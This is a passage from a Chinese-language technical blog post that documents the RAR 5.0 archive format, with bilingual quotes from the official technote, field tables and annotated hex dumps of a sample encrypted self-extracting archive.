style="text-align:left">未压缩扩展属性大小。以下为扩展属性附加字段。</td></tr><tr><td style="text-align:left">UNP_VER</td><td style="text-align:center">1</td><td style="text-align:left">提取扩展属性的RAR最低版本</td></tr><tr><td style="text-align:left">METHOD</td><td style="text-align:center">1</td><td style="text-align:left">压缩方式</td></tr><tr><td style="text-align:left">EA_CRC</td><td style="text-align:center">4</td><td style="text-align:left">扩展属性CRC</td></tr></tbody></table><h3 id="2-2、RAR-5-文件格式分析"><a href="#2-2、RAR-5-文件格式分析" class="headerlink" title="2.2、RAR 5+文件格式分析"></a>2.2、RAR 5+文件格式分析</h3><blockquote><p><strong><code>参考资料：</code></strong><br>1、<a href="https://www.rarlab.com/technote.htm" target="_blank" rel="noopener">https://www.rarlab.com/technote.htm</a></p></blockquote><p>&emsp;&emsp;Here we describe basic data structures of archive format introduced in RAR 5.0. If you need information about algorithms or more detailed information on data structures, please use UnRAR source code.<br>&emsp;&emsp;在这里，我们描述了<code>RAR 5.0</code>中引入的存档格式的<code>基本数据结构</code>。如果您需要有关算法的信息或有关数据结构的更多详细信息，请使用<code>UnRAR</code>源代码。</p><p><strong><code>实例环境：</code></strong></p><div align="left"><img src="/resources/2020/RAR_Format/env0.jpg" align:"left"="" width="50%" height="50%" alt="例子RAR文件环境0"><img src="/resources/2020/RAR_Format/env5.jpg" align:"right"="" width="50%" height="50%" alt="例子RAR文件环境1"></div><br><div align="left"><img src="/resources/2020/RAR_Format/env1.jpg" align:"left"="" width="50%" height="50%" alt="例子RAR文件环境2"><img src="/resources/2020/RAR_Format/env2.jpg" align:"right"="" width="50%" height="50%" alt="例子RAR文件环境3"></div><br><div align="left"><img src="/resources/2020/RAR_Format/env3.jpg" width="50%" height="50%" alt="例子RAR文件环境4"></div><br><div align="left"><img src="/resources/2020/RAR_Format/env4.jpg" width="80%" height="60%" alt="例子RAR文件环境5"></div><p>设置的密码<code>未加密文件名</code>。</p><h4 id="2-2-1、Data-types-数据类型"><a href="#2-2-1、Data-types-数据类型" class="headerlink" title="2.2.1、Data types(数据类型)"></a>2.2.1、Data types(数据类型)</h4><p><strong><code>vint</code></strong><br>&emsp;&emsp;Variable length integer. Can include one or more bytes, where lower 7 bits of every byte contain integer data and highest bit in every byte is the continuation flag. If highest bit is 0, this is the last byte in sequence. So first byte contains 7 least significant bits of integer and continuation flag. Second byte, if present, contains next 7 bits and so on.<br>&emsp;&emsp;<code>可变长度</code>整数。可以包含<code>一个</code>或<code>多个</code>字节，其中每个字节的<code>低7位</code>包含整数数据，而每个字节中的<code>最高位</code>是连续标志。如果<code>最高位为0</code>，则这是序列中的最后一个字节。因此，第一个字节包含<code>低位7个有效位的整数</code>和<code>连续标志</code>。第二个字节（如果存在）包含下一个7位，依此类推。<br>&emsp;&emsp;Currently RAR format uses vint to store up to 64 bit integers, resulting in 10 bytes maximum. This value may be increased in the future if necessary for some reason.<br>&emsp;&emsp;当前的RAR格式使用<code>vint</code>最多存储<code>64位</code>整数，所以<code>vint</code>最大可以包含<code>10个字节</code>。如果出于某种原因，将来可能会增加此值。<br>&emsp;&emsp;Sometimes RAR needs to pre-allocate space for vint before knowing its exact value. In such situation it can allocate more space than really necessary and then fill several leading bytes with 0x80 hexadecimal, which means 0 with continuation flag set.<br>&emsp;&emsp;有时，RAR需要在知道确切值之前为<code>vint</code>预先分配空间。在这种情况下，它可以分配<code>超出</code>实际需要的空间，然后用<code>0x80</code>十六进制填充几个前导字节，这意味着设置了<code>连续标志</code>。</p><p><strong><code>byte</code></strong>, <strong><code>uint16</code></strong>, <strong><code>uint32</code></strong>, <strong><code>uint64</code></strong><br>Byte, 16-, 32-, 64- bit unsigned integer in little endian format.<br><code>Byte</code>，<code>16bit</code>、<code>32bit</code>、<code>64bit</code>的无符号整型使用的都是<code>小端存储格式</code>。</p><p><strong><code>Variable length data(可变长度的数据)</code></strong><br>We use ellipsis … to denote variable length data areas.<br>我们使用<code>省略号(...)</code>表示<code>可变长度</code>的数据区域。</p><p><strong><code>Hexadecimal values(十六进制值)</code></strong><br>We use 0x prefix to define hexadecimal values, such as 0xf000.<br>我们使用0x前缀定义十六进制值，例如<code>0xf000</code>。</p><h4 id="2-2-2、General-archive-structure-通用压缩文档结构"><a href="#2-2-2、General-archive-structure-通用压缩文档结构" class="headerlink" title="2.2.2、General archive structure(通用压缩文档结构)"></a>2.2.2、General archive structure(通用压缩文档结构)</h4><p><strong><code>General archive block format(通用压缩文档块格式)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Extra area</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Extra area</code>”字段。在当前的实现中，该字段不得超过<code>3个字节</code>，从而导致最大的头大小为<code>2MB</code>。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left">压缩文档头的类型。可能的值为：<br> &emsp;&emsp;<code>0x01</code> - 压缩文档头。<br> &emsp;&emsp;<code>0x02</code> - 文件头。<br> &emsp;&emsp;<code>0x03</code> - 服务头。<br> &emsp;&emsp;<code>0x04</code> - 压缩文档加密头。<br> &emsp;&emsp;<code>0x05</code> - 结尾块。</td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Extra area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，扩展区域的大小。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域的大小。仅当设置了<code>0x02</code>头标志时才存在。</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">当前块类型专用的字段。有关详细信息，请参见具体块类型描述。</td></tr><tr><td style="text-align:left">Extra area</td><td style="text-align:center">…</td><td style="text-align:left"><code>可选字段</code>，扩展区域。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域。仅当设置了<code>0x02</code>头标志时才存在。用于存储大量数据，例如压缩文件数据。不包括“<code>Header CRC</code>”和“<code>Header size</code>”字段。</td></tr></tbody></table><p><strong><code>General extra area format(通用扩展区域格式)</code></strong><br>Extra area can include one or more records having the following format:<br>扩展区域可以包含一个或多个具有以下格式的记录：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>记录类型</code>。不同的压缩文档块具有不同的关联的扩展区域记录类型。阅读具体的压缩文档块描述以获取详细信息。将来可以添加新的记录类型，因此需要跳过未知的记录类型而不中断操作。</td></tr><tr><td style="text-align:left">Data</td><td style="text-align:center">…</td><td style="text-align:left"><code>记录相关数据</code>。如果记录仅由Size和Type组成，则可能会丢失。</td></tr></tbody></table><p><strong><code>General archive layout(通用压缩文档布局)</code></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Self-extracting module(optional)：自解压模块(可选的)</span><br><span class="line">RAR 5.0 signature：RAR5.0签名</span><br><span class="line">Archive encryption header(optional)：压缩文档加密头(可选的)</span><br><span class="line">Main archive header：压缩文档头</span><br><span class="line">Archive comment service header(optional)：压缩文档注释服务头(可选的)</span><br><span class="line"></span><br><span class="line">File header 1：文件头1</span><br><span class="line">Service headers(NTFS ACL, streams, etc.)<span class="keyword">for</span> preceding file(optional)：前一个文件的服务头(可选的)</span><br><span class="line">...</span><br><span class="line">File header N：文件头N</span><br><span class="line">Service headers(NTFS ACL, streams, etc.)<span class="keyword">for</span> preceding file(optional)：前一个文件的服务头(可选的)</span><br><span class="line"></span><br><span class="line">Recovery record(optional)：恢复记录(可选的)</span><br><span class="line">End of archive header：结尾块</span><br></pre></td></tr></table></figure></p><h4 id="2-2-3、Archive-blocks-压缩文档块"><a href="#2-2-3、Archive-blocks-压缩文档块" class="headerlink" title="2.2.3、Archive blocks(压缩文档块)"></a>2.2.3、Archive blocks(压缩文档块)</h4><h5 id="2-2-3-1、Self-extracting-module-SFX-自解压模块"><a href="#2-2-3-1、Self-extracting-module-SFX-自解压模块" class="headerlink" title="2.2.3.1、Self-extracting module (SFX)(自解压模块)"></a>2.2.3.1、<strong><code>Self-extracting module (SFX)(自解压模块)</code></strong></h5><p>&emsp;&emsp;Any data preceding the archive signature. Self-extracting module size and contents is not defined. At the moment of writing this documentation RAR assumes the maximum SFX module size to not exceed 1 MB, but this value can be increased in the future.<br>&emsp;&emsp;<code>压缩文档签名</code>之前的所有数据。<code>自解压模块</code>的大小和内容未定义。在撰写本文档时，RAR假定<code>SFX模块</code>的最大大小不超过1 MB，但是以后可以增加该值。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/SFX1.jpg" alt="自解压模块头"><br><img src="/resources/2020/RAR_Format/SFX2.jpg" alt="自解压模块尾"></p><h5 id="2-2-3-2、RAR-5-0-signature-RAR5-0签名"><a href="#2-2-3-2、RAR-5-0-signature-RAR5-0签名" class="headerlink" title="2.2.3.2、RAR 5.0 signature(RAR5.0签名)"></a>2.2.3.2、<strong><code>RAR 5.0 signature(RAR5.0签名)</code></strong></h5><p>&emsp;&emsp;RAR 5.0 signature consists of 8 bytes: 0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00. You need to search for this signature in supposed archive from beginning and up to maximum SFX module size. Just for comparison this is RAR 4.x 7 byte length signature: 0x52 0x61 0x72 0x21 0x1A 0x07 0x00.<br>&emsp;&emsp;<code>RAR 5.0签名</code>由8个字节组成：<code>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00</code>。您需要从假想的压缩文档中搜索该签名，从开始到最大SFX模块大小。只是为了比较，这是<code>RAR 4.x</code> 7字节长度的签名：<code>0x52 0x61 0x72 0x21 0x1A 0x07 0x00</code>。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/RAR 5.0 signature.jpg" alt="RAR 5.0签名"></p><h5 id="2-2-3-3、Archive-encryption-header-压缩文档加密块"><a href="#2-2-3-3、Archive-encryption-header-压缩文档加密块" class="headerlink" title="2.2.3.3、Archive encryption header(压缩文档加密块)"></a>2.2.3.3、<strong><code>Archive encryption header(压缩文档加密块)</code></strong></h5><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Check value</code>”字段的CRC32校验码。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Check value</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x04</code></td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Encryption version</td><td style="text-align:center">vint</td><td style="text-align:left"><code>加密算法的版本</code>。现在仅支持0版本(AES-256)。</td></tr><tr><td style="text-align:left">Encryption flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x00</code> - 不存在密码检查数据(Check value字段)。 <br> <code>0x01</code> - 存在密码检查数据(Check value字段)。</td></tr><tr><td style="text-align:left">KDF count</td><td style="text-align:center">1 byte</td><td style="text-align:left"><code>PBKDF2函数</code>的<code>迭代数</code>的<code>二进制对数</code>。 RAR可以拒绝处理<code>超过</code>某个阈值的KDF计数。阈值的具体值取决于<code>版本</code>。</td></tr><tr><td style="text-align:left">Salt</td><td style="text-align:center">16 byte</td><td style="text-align:left">全局地用于<code>所有加密</code>的压缩文档头的盐值。</td></tr><tr><td style="text-align:left">Check value</td><td style="text-align:center">12 byte</td><td style="text-align:left">用于<code>验证密码有效性</code>的值。仅当设置了<code>0x01</code>加密标志时才存在。<code>前8个字节</code>是使用额外的PBKDF2轮次计算的，<code>最后4个字节</code>是额外的校验和。与标准<code>Header CRC32</code>一起，我们具有<code>64位校验和</code>，以可靠地<code>验证此字段的完整性</code>并区分<code>无效的密码</code>和<code>损坏的数据</code>。可以在UnRAR源代码中找到更多详细信息。</td></tr></tbody></table><p>&emsp;&emsp;This header is present only in archives with encrypted headers. Every next header after this one is started from 16 byte AES-256 initialization vector followed by encrypted header data. Size of encrypted header data block is aligned to 16 byte boundary.<br>&emsp;&emsp;该头仅存在于<code>带有加密头</code>的压缩文档中。此后的<code>每下一个头</code>均从16字节<code>AES-256初始化向量</code>开始，然后是<code>加密的头数据</code>。加密头数据块的大小与16字节边界对齐。</p><p><strong><code>实例：</code></strong><br>这是设置密码时勾选了<code>加密文件名</code>后，出现的块。<br><img src="/resources/2020/RAR_Format/Archive encryption header.jpg" alt="压缩文档加密块"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000 - 00310783 SFX(自解压模块)</span><br><span class="line"></span><br><span class="line">00310784 - 00310791</span><br><span class="line">52 61 72 21 1A 07 01 00</span><br><span class="line"></span><br><span class="line">00310792 - 00310829</span><br><span class="line">49 23 54 91 - Header CRC32( Header size -&gt; Check value )</span><br><span class="line">21 - Header size( Header <span class="built_in">type</span> -&gt; Check value ) 21H = 33D</span><br><span class="line">04 - Header <span class="built_in">type</span>( 压缩文档加密块 )</span><br><span class="line">00 - Header flags</span><br><span class="line">00 - Encryption version</span><br><span class="line">01 - Encryption flags</span><br><span class="line">0F - KDF count</span><br><span class="line">89 54 B1 34 4A 94 3D 09 FA 1A CB 8A C8 A9 F3 A3 - Salt</span><br><span class="line">21 43 42 86 61 24 8A 16 E4 1B C8 8E - Check value</span><br></pre></td></tr></table></figure><h5 id="2-2-3-4、Main-archive-header-压缩文件头"><a href="#2-2-3-4、Main-archive-header-压缩文件头" class="headerlink" title="2.2.3.4、Main archive header(压缩文件头)"></a>2.2.3.4、<strong><code>Main archive header(压缩文件头)</code></strong></h5><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Extra area</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Extra area</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code></td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Extra area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，扩展区域的大小。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Archive flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 卷。压缩文档是多卷集的一部分。 <br> <code>0x02</code> - “Volume number”字段存在。除第一卷外，所有的卷都存在此标志。 <br> <code>0x04</code> - 可靠的压缩文档。 <br> <code>0x08</code> - 存在恢复记录。 <br> <code>0x10</code> - 压缩文档已锁定。</td></tr><tr><td style="text-align:left">Volume number</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，仅当设置了Archive flags的<code>0x02</code>位时才显示。第一卷不存在，第二卷为1，第三卷为2，依此类推。</td></tr><tr><td style="text-align:left">Extra area</td><td style="text-align:center">…</td><td style="text-align:left"><code>可选字段</code>，扩展区域。仅当设置了<code>0x01</code>头标志时才存在。</td></tr></tbody></table><p>Extra area of main archive header can contain following record types：<br><code>压缩文件头</code>的<code>扩展区域</code>可以包含以下记录类型：</p><table><thead><tr><th style="text-align:left">类型编号</th><th style="text-align:left">类型名称</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">0x01</td><td style="text-align:left">Locator</td><td style="text-align:left">包含<code>不同服务块</code>的位置，因此可以<code>快速访问</code>它们，而无需扫描整个压缩文档。该记录是<code>可选的</code>。如果缺少它，仍然有必要扫描<code>整个压缩文件</code>以验证服务块的存在。</td></tr></tbody></table><p><strong><code>Locator record(定位记录)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - “Quick open record offset”字段存在。 <br> <code>0x02</code> - “Recovery record offset”字段存在。</td></tr><tr><td style="text-align:left">Quick open offset</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，从<code>“Quick open”服务块的开始</code>到<code>Main archive header的开始</code>的距离。仅当设置了<code>0x01</code>标志时才存在。如果等于0，则应忽略。如果预分配的空间不足以存储产生的偏移量，则可以将其设置为零。</td></tr><tr><td style="text-align:left">Recovery record offset</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，从<code>“Recovery record”服务块的开始</code>到<code>Main archive header的开始</code>的距离。仅当设置了<code>0x02</code>标志时才存在。如果等于0，则应忽略。如果预分配的空间不足以存储产生的偏移量，则可以将其设置为零。</td></tr></tbody></table><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/Main archive header.jpg" alt="压缩文件头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00310792 - 00310811</span><br><span class="line">49 64 D1 32 - Header CRC32( Header size -&gt; Extra area )</span><br><span class="line">0F - Header size( Header <span class="built_in">type</span> -&gt; Extra area ) 0FH = 15D</span><br><span class="line">01 - Header <span class="built_in">type</span>( 压缩文件头 )</span><br><span class="line">05 - Header flags( 0x05 = 0x01 + 0x04 )</span><br><span class="line">0B - Extra area size( 0BH = 11D )</span><br><span class="line">18 - Archive flags( 0x18 = 0x10 + 0x08 )</span><br><span class="line">0A - Size[ Extra area ] 0AH = 10D</span><br><span class="line">01 - Type( Locator record )</span><br><span class="line">03 - Flags( 0x03 = 0x01 + 0x02 )</span><br><span class="line">A3 C7 81 00 - Quick open offset</span><br><span class="line">DB C8 81 00 - Recovery record offset</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Quick open offset</span><br><span class="line">0x0081C7A3( 00000000 10000001 ‭11000111‬ ‭10100011 ‬)</span><br><span class="line">0000001 1000111‬ 0100011‬B = 01100011 1‬0100011‬B = 63A3H = ‭25507‬D</span><br><span class="line">310792 + 25507 = 336299</span><br><span class="line">2、Recovery record offset</span><br><span class="line">0x0081C8DB( ‭00000000 10000001 11001000 11011011 ‬)</span><br><span class="line">0000001 1001000 1011011‬B = 01100100 01011011‬B = 645BH = ‭25691‬D</span><br><span class="line">310792 + ‭25691‬ = ‭336483‬</span><br><span class="line">---------------------------------------------------------------</span><br></pre></td></tr></table></figure><h5 id="2-2-3-5、File-header-and-service-header-文件头和服务头"><a href="#2-2-3-5、File-header-and-service-header-文件头和服务头" class="headerlink" title="2.2.3.5、File header and service header(文件头和服务头)"></a>2.2.3.5、<strong><code>File header and service header(文件头和服务头)</code></strong></h5><p>&emsp;&emsp;These two header types use the similar data structure, so we describe them both here.<br>&emsp;&emsp;这两种头类型使用相似的数据结构，因此我们在这里对它们一起进行描述。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Name</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Name</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x02</code> - 文件头 <br> <code>0x03</code> - 服务头</td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Extra area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，扩展区域的大小。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域的大小。仅当设置了<code>0x02</code>头标志时才存在。</td></tr><tr><td style="text-align:left">File flags</td><td style="text-align:center">vint</td><td style="text-align:left">这些头类型专用的标志：<br> &emsp;&emsp;<code>0x01</code> - 目录文件系统对象(文件头)。<br> &emsp;&emsp;<code>0x02</code> - 存在Unix格式的时间字段。<br> &emsp;&emsp;<code>0x04</code> - 存在CRC32字段。<br> &emsp;&emsp;<code>0x08</code> - 解压后大小未知。<br> 如果设置了标志<code>0x08</code>，则“<code>Unpacked size</code>”字段仍然存在，但是必须忽略，并且必须执行提取，直到到达压缩流的末尾。如果实际文件大小大于操作系统报告的大小，或者文件大小未知（例如，除从stdin到multivolume archive归档时的最后一个卷以外的所有卷），则可以设置此标志。</td></tr><tr><td style="text-align:left">Unpacked size</td><td style="text-align:center">vint</td><td style="text-align:left">解压缩的<code>文件</code>或<code>服务数据</code>大小。</td></tr><tr><td style="text-align:left">Attributes</td><td style="text-align:center">vint</td><td style="text-align:left">如果是<code>文件头</code>，则为操作系统特定的文件属性。如果是<code>服务头</code>，可以用于特定数据需求，也可以保留，并可以设置为0。</td></tr><tr><td style="text-align:left">mtime</td><td style="text-align:center">uint32</td><td style="text-align:left"><code>可选字段</code>，Unix时间格式的<code>文件修改时间</code>。如果设置了<code>0x02</code>文件标志，则存在。</td></tr><tr><td style="text-align:left">Data CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left"><code>可选字段</code>，已解压缩的<code>文件</code>或<code>服务数据</code>的CRC32。对于在卷之间分割的文件，它包含当前卷中除最后文件部分以外的所有文件部分所包含的文件打包数据的CRC32。如果设置了<code>0x04</code>文件标志，则存在。</td></tr><tr><td style="text-align:left">Compression information</td><td style="text-align:center">vint</td><td style="text-align:left"><code>低6位(0x003f)</code>：压缩算法的版本，可能有0-63个值。当前版本是0。<br> <code>第7位(0x0040)</code>：定义solid flag。如果已设置，RAR将在处理之前的文件后继续使用剩下的压缩字典。只能为文件头设置，而不能为服务头设置。<br> <code>第8-10位(0x0380)</code>：定义压缩方法。当前仅使用值0-5。<br> &emsp;&emsp;10 9 8 位<br> &emsp;&emsp;<code>0 0 0</code> - 存储 <br> &emsp;&emsp;<code>0 0 1</code> - 最快压缩 <br> &emsp;&emsp;<code>0 1 0</code> - 较快压缩 <br> &emsp;&emsp;<code>0 1 1</code> - 标准压缩 <br> &emsp;&emsp;<code>1 0 0</code> - 较好压缩 <br> &emsp;&emsp;<code>1 0 1</code> - 最好压缩<br> <code>第11-14位(0x3c00)</code>：定义提取数据所需的字典大小的最小大小。<br> &emsp;&emsp;14 13 12 11 位<br> &emsp;&emsp;<code>0 0 0 0</code> - 字典大小 128KB<br> &emsp;&emsp;<code>0 0 0 1</code> - 字典大小 256KB<br> &emsp;&emsp;<code>0 0 1 0</code> - 字典大小 512KB<br> &emsp;&emsp;<code>0 0 1 1</code> - 字典大小 1MB<br> &emsp;&emsp;<code>0 1 0 0</code> - 字典大小 2MB<br> &emsp;&emsp;<code>0 1 0 1</code> - 字典大小 4MB<br> &emsp;&emsp;<code>0 1 1 0</code> - 字典大小 8MB<br> &emsp;&emsp;<code>0 1 1 1</code> - 字典大小 16MB<br> &emsp;&emsp;<code>1 0 0 0</code> - 字典大小 32MB<br> &emsp;&emsp;<code>1 0 0 1</code> - 字典大小 64MB<br> &emsp;&emsp;<code>1 0 1 0</code> - 字典大小 128MB<br> &emsp;&emsp;<code>1 0 1 1</code> - 字典大小 256MB<br> &emsp;&emsp;<code>1 1 0 0</code> - 字典大小 512MB<br> &emsp;&emsp;<code>1 1 0 1</code> - 字典大小 1024MB<br> &emsp;&emsp;<code>1 1 1 0</code> - 字典大小 2048MB<br> &emsp;&emsp;<code>1 1 1 1</code> - 字典大小 4096MB</td></tr><tr><td style="text-align:left">Host OS</td><td style="text-align:center">vint</td><td style="text-align:left">用于创建压缩文档的操作系统的类型： <br> <code>0x00</code> - Windows <br> <code>0x01</code> - Unix</td></tr><tr><td style="text-align:left">Name length</td><td style="text-align:center">vint</td><td style="text-align:left"><code>文件</code>或<code>服务头</code>名称的长度。</td></tr><tr><td style="text-align:left">Name</td><td style="text-align:center">N bytes</td><td style="text-align:left">1、可变长度字段，包含UTF-8格式的名称，不以0结尾。<br> 2、对于<code>文件头</code>，这是已压缩文件的名称。正斜杠字符用作Unix和Windows名称的路径分隔符。对于Unix文件名称，反斜杠被视为名称的一部分，对于Windows文件名称，反斜杠被视为无效字符。名称类型由“Host OS”字段定义。<br> 3、如果Unix文件名包含无法正确转换为Unicode和UTF-8的任何高级ASCII字符，我们会将这些字符映射到0xE080-0xE0FF私有Unicode区域，并在结果字符串中插入Unicode非字符0xFFFE以表明它包含已映射字符，提取时需要转换回去。没有定义0xFFFE的具体位置，我们需要搜索整个字符串。此类映射的名称不可移植，并且只能在创建它们的同一系统上正确解压缩。<br> 4、对于<code>服务头</code>，此字段包含服务头的名称。现在使用以下名称：<br> <code>CMT</code> - 压缩文档注释 <br> <code>QO</code> - 压缩文档Quick open数据 <br> <code>ACL</code> - NTFS文件权限 <br> <code>STM</code> - NTFS交换数据流 <br> <code>RR</code> - 恢复记录</td></tr><tr><td style="text-align:left">Extra area</td><td style="text-align:center">…</td><td style="text-align:left"><code>可选字段</code>，扩展区域，包含附加的头字段。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area</td><td style="text-align:center">vint</td><td 